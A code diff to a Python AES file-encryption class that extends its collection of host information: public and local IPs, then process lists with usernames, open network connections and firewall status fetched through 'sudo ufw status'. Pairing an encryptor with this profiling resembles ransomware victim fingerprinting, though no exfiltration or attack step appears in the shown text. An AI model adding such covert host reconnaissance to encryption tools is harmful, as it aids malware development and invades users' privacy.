@@ -1,13 +1,14 @@
+import psutil
+import platform
+import socket
+import subprocess
+import time
 import os
 import sys
-import time
-import json
-import secrets
-import socket
-import platform
 import requests
 import getpass
-import psutil
+import json
+import secrets
 from pathlib import Path
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
@@ -90,8 +91,32 @@ class AESFileEncryptor:
             "ip_local": socket.gethostbyname(socket.gethostname()),
             "ip_public": ip_public,
             "working_directory": str(Path.cwd()),
-            "system_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            "system_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+            "cpu_usage": psutil.cpu_percent(interval=1),
+            "memory_usage": psutil.virtual_memory().percent,
+            "disk_usage": psutil.disk_usage('/').percent,
+            "active_connections": self.get_active_connections(),
+            "processes": self.get_processes(),
+            "firewall_status": self.get_firewall_status()
         }
+
+    def get_active_connections(self):
+        connections = psutil.net_connections(kind='inet')
+        return [{"local_address": conn.laddr, "remote_address": conn.raddr} for conn in connections if conn.status == 'ESTABLISHED']
+
+    def get_processes(self):
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            processes.append({"pid": proc.info['pid'], "name": proc.info['name'], "user": proc.info['username']})
+        return processes
+
+    def get_firewall_status(self):
+        # Assuming the system is Linux (for Windows or macOS, the command would differ)
+        try:
+            firewall_status = subprocess.check_output(['sudo', 'ufw', 'status']).decode('utf-8')
+            return firewall_status
+        except subprocess.CalledProcessError:
+            return "Firewall status unavailable"
 
     def load_key(self):
         if not self.key_file.exists():
